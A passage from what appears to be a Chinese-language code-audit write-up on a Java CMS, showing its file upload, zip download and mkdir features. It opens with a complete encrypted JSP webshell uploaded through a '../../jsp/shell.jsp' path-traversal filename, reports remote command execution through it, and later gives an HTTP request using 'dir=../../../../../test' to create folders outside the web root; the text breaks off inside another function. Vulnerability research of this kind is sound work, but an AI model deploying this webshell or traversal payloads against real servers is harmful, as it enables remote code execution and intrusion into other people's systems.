+</span></span><span class=line><span class=cl>    {
+</span></span><span class=line><span class=cl>        String k=&#34;e45e329feb5d925b&#34;;
+</span></span><span class=line><span class=cl>        javax.crypto.Cipher c=javax.crypto.Cipher.getInstance(&#34;AES/ECB/PKCS5Padding&#34;);c.init(2,new javax.crypto.spec.SecretKeySpec(k.getBytes(),&#34;AES&#34;));
+</span></span><span class=line><span class=cl>        byte[] decodebs;
+</span></span><span class=line><span class=cl>        Class baseCls ;
+</span></span><span class=line><span class=cl>                try{
+</span></span><span class=line><span class=cl>                    baseCls=Class.forName(&#34;java.util.Base64&#34;);
+</span></span><span class=line><span class=cl>                    Object Decoder=baseCls.getMethod(&#34;getDecoder&#34;, null).invoke(baseCls, null);
+</span></span><span class=line><span class=cl>                    decodebs=(byte[]) Decoder.getClass().getMethod(&#34;decode&#34;, new Class[]{byte[].class}).invoke(Decoder, new Object[]{data});
+</span></span><span class=line><span class=cl>                }
+</span></span><span class=line><span class=cl>                catch (Throwable e)
+</span></span><span class=line><span class=cl>                {
+</span></span><span class=line><span class=cl>                    baseCls = Class.forName(&#34;sun.misc.BASE64Decoder&#34;);
+</span></span><span class=line><span class=cl>                    Object Decoder=baseCls.newInstance();
+</span></span><span class=line><span class=cl>                    decodebs=(byte[]) Decoder.getClass().getMethod(&#34;decodeBuffer&#34;,new Class[]{String.class}).invoke(Decoder, new Object[]{new String(data)});
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>                }
+</span></span><span class=line><span class=cl>        return c.doFinal(decodebs);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>%&gt;
+</span></span><span class=line><span class=cl>&lt;%!class U extends ClassLoader{U(ClassLoader c){super(c);}public Class g(byte []b){return
+</span></span><span class=line><span class=cl>        super.defineClass(b,0,b.length);}}%&gt;&lt;%if (request.getMethod().equals(&#34;POST&#34;)){
+</span></span><span class=line><span class=cl>            ByteArrayOutputStream bos = new ByteArrayOutputStream();
+</span></span><span class=line><span class=cl>            byte[] buf = new byte[512];
+</span></span><span class=line><span class=cl>            int length=request.getInputStream().read(buf);
+</span></span><span class=line><span class=cl>            while (length&gt;0)
+</span></span><span class=line><span class=cl>            {
+</span></span><span class=line><span class=cl>                byte[] data= Arrays.copyOfRange(buf,0,length);
+</span></span><span class=line><span class=cl>                bos.write(data);
+</span></span><span class=line><span class=cl>                length=request.getInputStream().read(buf);
+</span></span><span class=line><span class=cl>            }
+</span></span><span class=line><span class=cl>            /* 取消如下代码的注释，可避免response.getOutputstream报错信息，增加某些深度定制的Java web系统的兼容性
+</span></span><span class=line><span class=cl>            out.clear();
+</span></span><span class=line><span class=cl>            out=pageContext.pushBody();
+</span></span><span class=line><span class=cl>            */
+</span></span><span class=line><span class=cl>            out.clear();
+</span></span><span class=line><span class=cl>            out=pageContext.pushBody();
+</span></span><span class=line><span class=cl>        new U(this.getClass().getClassLoader()).g(Decrypt(bos.toByteArray())).newInstance().equals(pageContext);}
+</span></span><span class=line><span class=cl>%&gt;
+</span></span><span class=line><span class=cl>------WebKitFormBoundaryZzeGAny76zA7fCma--
+</span></span></code></pre></td></tr></table></div></div><p>​ 修改文件名为../../jsp/shell.jsp，之后我们访问<a class=link href=http://192.168.227.43:8888/shell.jsp target=_blank rel=noopener>192.168.227.43:8888/shell.jsp</a>，会发现没有提示404也就是传马成功了，我们使用冰蝎链接，并输入calc命令弹出计算机，可见命令成功执行。</p><p><img src=/p/cs_singlewindow_cms/image-20241209173729074.png width=1054 height=814 srcset="/p/cs_singlewindow_cms/image-20241209173729074_hu7836589400602091729.png 480w, /p/cs_singlewindow_cms/image-20241209173729074_hu12234103615572878301.png 1024w" loading=lazy alt=image-20241209173729074 class=gallery-image data-flex-grow=129 data-flex-basis=310px></p><h5 id=下载>下载</h5><p>控制器：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequiresPermissions</span><span class=p>(</span><span class=s>&#34;core:web_file_2:zip_download&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=s>&#34;zip_download.do&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>zipDownload</span><span class=p>(</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>RedirectAttributes</span><span class=w> </span><span class=n>ra</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=kd>super</span><span class=p>.</span><span class=na>zipDownload</span><span class=p>(</span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>ra</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>压缩下载实现函数：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
+</span><span class=lnt>25
+</span><span class=lnt>26
+</span><span class=lnt>27
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=kd>protected</span><span class=w> </span><span class=kt>void</span><span class=w> </span><span class=nf>zipDownload</span><span class=p>(</span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>RedirectAttributes</span><span class=w> </span><span class=n>ra</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Site</span><span class=w> </span><span class=n>site</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Context</span><span class=p>.</span><span class=na>getCurrentSite</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>FileHandler</span><span class=w> </span><span class=n>fileHandler</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getFileHandler</span><span class=p>(</span><span class=n>site</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=p>(</span><span class=n>fileHandler</span><span class=w> </span><span class=k>instanceof</span><span class=w> </span><span class=n>LocalFileHandler</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CmsException</span><span class=p>(</span><span class=s>&#34;ftp cannot support ZIP.&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>LocalFileHandler</span><span class=w> </span><span class=n>localFileHandler</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=p>(</span><span class=n>LocalFileHandler</span><span class=p>)</span><span class=w> </span><span class=n>fileHandler</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=o>[]</span><span class=w> </span><span class=n>ids</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Servlets</span><span class=p>.</span><span class=na>getParamValues</span><span class=p>(</span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=s>&#34;ids&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>base</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getBase</span><span class=p>(</span><span class=n>site</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>File</span><span class=o>[]</span><span class=w> </span><span class=n>files</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>File</span><span class=o>[</span><span class=n>ids</span><span class=p>.</span><span class=na>length</span><span class=o>]</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>for</span><span class=w> </span><span class=p>(</span><span class=kt>int</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>0</span><span class=p>,</span><span class=w> </span><span class=n>len</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>ids</span><span class=p>.</span><span class=na>length</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=w> </span><span class=o>&lt;</span><span class=w> </span><span class=n>len</span><span class=p>;</span><span class=w> </span><span class=n>i</span><span class=o>++</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>Validations</span><span class=p>.</span><span class=na>uri</span><span class=p>(</span><span class=n>ids</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>,</span><span class=w> </span><span class=n>base</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>				</span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CmsException</span><span class=p>(</span><span class=s>&#34;invalidURI&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>files</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>localFileHandler</span><span class=p>.</span><span class=na>getFile</span><span class=p>(</span><span class=n>ids</span><span class=o>[</span><span class=n>i</span><span class=o>]</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>response</span><span class=p>.</span><span class=na>setContentType</span><span class=p>(</span><span class=s>&#34;application/x-download;charset=UTF-8&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>response</span><span class=p>.</span><span class=na>addHeader</span><span class=p>(</span><span class=s>&#34;Content-disposition&#34;</span><span class=p>,</span><span class=w> </span><span class=s>&#34;filename=download_files.zip&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>try</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>AntZipUtils</span><span class=p>.</span><span class=na>zip</span><span class=p>(</span><span class=n>files</span><span class=p>,</span><span class=w> </span><span class=n>response</span><span class=p>.</span><span class=na>getOutputStream</span><span class=p>());</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w> </span><span class=k>catch</span><span class=w> </span><span class=p>(</span><span class=n>IOException</span><span class=w> </span><span class=n>e</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>logger</span><span class=p>.</span><span class=na>error</span><span class=p>(</span><span class=s>&#34;zip error!&#34;</span><span class=p>,</span><span class=w> </span><span class=n>e</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这段代码的核心功能就是从请求获取所有的文件，然后遍历这些文件，打包到压缩包里边。分析得出在这一部分检测了文件名的&rsquo;..&lsquo;所以这里是不存在任意文件下载的。</p><h5 id=创建>创建</h5><p>控制器：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequiresPermissions</span><span class=p>(</span><span class=s>&#34;core:web_file_2:mkdir&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;mkdir.do&#34;</span><span class=p>,</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>RequestMethod</span><span class=p>.</span><span class=na>POST</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>mkdir</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>parentId</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>dir</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>RedirectAttributes</span><span class=w> </span><span class=n>ra</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=kd>super</span><span class=p>.</span><span class=na>mkdir</span><span class=p>(</span><span class=n>parentId</span><span class=p>,</span><span class=w> </span><span class=n>dir</span><span class=p>,</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>ra</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>功能实现：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=kd>protected</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>mkdir</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>parentId</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>dir</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>RedirectAttributes</span><span class=w> </span><span class=n>ra</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>Site</span><span class=w> </span><span class=n>site</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>Context</span><span class=p>.</span><span class=na>getCurrentSite</span><span class=p>();</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>parentId</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>parentId</span><span class=w> </span><span class=o>==</span><span class=w> </span><span class=kc>null</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=s>&#34;&#34;</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>parentId</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>String</span><span class=w> </span><span class=n>base</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getBase</span><span class=p>(</span><span class=n>site</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>StringUtils</span><span class=p>.</span><span class=na>isBlank</span><span class=p>(</span><span class=n>parentId</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>parentId</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>base</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=o>!</span><span class=n>Validations</span><span class=p>.</span><span class=na>uri</span><span class=p>(</span><span class=n>parentId</span><span class=p>,</span><span class=w> </span><span class=n>base</span><span class=p>))</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=k>throw</span><span class=w> </span><span class=k>new</span><span class=w> </span><span class=n>CmsException</span><span class=p>(</span><span class=s>&#34;invalidURI&#34;</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>FileHandler</span><span class=w> </span><span class=n>fileHandler</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>getFileHandler</span><span class=p>(</span><span class=n>site</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=kt>boolean</span><span class=w> </span><span class=n>success</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>fileHandler</span><span class=p>.</span><span class=na>mkdir</span><span class=p>(</span><span class=n>dir</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>if</span><span class=w> </span><span class=p>(</span><span class=n>success</span><span class=p>)</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>logService</span><span class=p>.</span><span class=na>operation</span><span class=p>(</span><span class=s>&#34;opr.role.add&#34;</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;/&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>dir</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=kc>null</span><span class=p>,</span><span class=w> </span><span class=n>request</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>logger</span><span class=p>.</span><span class=na>info</span><span class=p>(</span><span class=s>&#34;mkdir file, name={}.&#34;</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=s>&#34;/&#34;</span><span class=w> </span><span class=o>+</span><span class=w> </span><span class=n>dir</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=p>}</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>ra</span><span class=p>.</span><span class=na>addFlashAttribute</span><span class=p>(</span><span class=s>&#34;refreshLeft&#34;</span><span class=p>,</span><span class=w> </span><span class=kc>true</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>ra</span><span class=p>.</span><span class=na>addAttribute</span><span class=p>(</span><span class=s>&#34;parentId&#34;</span><span class=p>,</span><span class=w> </span><span class=n>parentId</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=n>ra</span><span class=p>.</span><span class=na>addFlashAttribute</span><span class=p>(</span><span class=n>MESSAGE</span><span class=p>,</span><span class=w> </span><span class=n>success</span><span class=w> </span><span class=o>?</span><span class=w> </span><span class=n>OPERATION_SUCCESS</span><span class=w> </span><span class=p>:</span><span class=w> </span><span class=n>OPERATION_FAILURE</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=s>&#34;redirect:list.do&#34;</span><span class=p>;</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>​ 这个代码是在上传文件中的新建文件夹中，经过审计我发现，这里虽存在拦截，但是拦截的对象是parentId。而dir未被拦截，所以我们可以构造如下的数据包。</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-http data-lang=http><span class=line><span class=cl><span class=nf>POST</span> <span class=nn>/cmscp/core/web_file_2/mkdir.do</span> <span class=kr>HTTP</span><span class=o>/</span><span class=m>1.1</span>
+</span></span><span class=line><span class=cl><span class=n>Host</span><span class=o>:</span> <span class=l>172.21.87.148:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Length</span><span class=o>:</span> <span class=l>25</span>
+</span></span><span class=line><span class=cl><span class=n>Cache-Control</span><span class=o>:</span> <span class=l>max-age=0</span>
+</span></span><span class=line><span class=cl><span class=n>Origin</span><span class=o>:</span> <span class=l>http://172.21.87.148:8888</span>
+</span></span><span class=line><span class=cl><span class=n>Content-Type</span><span class=o>:</span> <span class=l>application/x-www-form-urlencoded</span>
+</span></span><span class=line><span class=cl><span class=n>Upgrade-Insecure-Requests</span><span class=o>:</span> <span class=l>1</span>
+</span></span><span class=line><span class=cl><span class=n>User-Agent</span><span class=o>:</span> <span class=l>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36 Edg/131.0.0.0</span>
+</span></span><span class=line><span class=cl><span class=n>Accept</span><span class=o>:</span> <span class=l>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span>
+</span></span><span class=line><span class=cl><span class=n>Referer</span><span class=o>:</span> <span class=l>http://172.21.87.148:8888/cmscp/core/web_file_2/list.do</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Encoding</span><span class=o>:</span> <span class=l>gzip, deflate</span>
+</span></span><span class=line><span class=cl><span class=n>Accept-Language</span><span class=o>:</span> <span class=l>zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6</span>
+</span></span><span class=line><span class=cl><span class=n>Cookie</span><span class=o>:</span> <span class=l>select_id=%2F1; open_ids=%2F1; _site=1; JSESSIONID=CA7DD070F74CFE10991C0475CE82606D</span>
+</span></span><span class=line><span class=cl><span class=n>Connection</span><span class=o>:</span> <span class=l>close</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>parentId=%2F1&amp;dir=../../../../../test
+</span></span></code></pre></td></tr></table></div></div><p>​ 就可以实现在项目的根路径下创建一个test文件夹。</p><p><img src=/p/cs_singlewindow_cms/image-20241210114831516.png width=830 height=603 srcset="/p/cs_singlewindow_cms/image-20241210114831516_hu5109417689774319914.png 480w, /p/cs_singlewindow_cms/image-20241210114831516_hu188370298045854913.png 1024w" loading=lazy alt=image-20241210114831516 class=gallery-image data-flex-grow=137 data-flex-basis=330px></p><p>控制器：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-java data-lang=java><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequiresPermissions</span><span class=p>(</span><span class=s>&#34;core:web_file_2:save&#34;</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=nd>@RequestMapping</span><span class=p>(</span><span class=n>value</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=s>&#34;save.do&#34;</span><span class=p>,</span><span class=w> </span><span class=n>method</span><span class=w> </span><span class=o>=</span><span class=w> </span><span class=n>RequestMethod</span><span class=p>.</span><span class=na>POST</span><span class=p>)</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=kd>public</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=nf>save</span><span class=p>(</span><span class=n>String</span><span class=w> </span><span class=n>parentId</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>text</span><span class=p>,</span><span class=w> </span><span class=n>String</span><span class=w> </span><span class=n>redirect</span><span class=p>,</span><span class=w> </span><span class=n>HttpServletRequest</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>			</span><span class=n>HttpServletResponse</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>RedirectAttributes</span><span class=w> </span><span class=n>ra</span><span class=p>)</span><span class=w> </span><span class=kd>throws</span><span class=w> </span><span class=n>IOException</span><span class=w> </span><span class=p>{</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>		</span><span class=k>return</span><span class=w> </span><span class=kd>super</span><span class=p>.</span><span class=na>save</span><span class=p>(</span><span class=n>parentId</span><span class=p>,</span><span class=w> </span><span class=n>name</span><span class=p>,</span><span class=w> </span><span class=n>text</span><span class=p>,</span><span class=w> </span><span class=n>redirect</span><span class=p>,</span><span class=w> </span><span class=n>request</span><span class=p>,</span><span class=w> </span><span class=n>response</span><span class=p>,</span><span class=w> </span><span class=n>ra</span><span class=p>);</span><span class=w>
+</span></span></span><span class=line><span class=cl><span class=w>	</span><span class=p>}</span><span class=w>
+</span></span></span></code></pre></td></tr></table></div></div><p>功能实现：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span><span class=lnt>23
+</span><span class=lnt>24
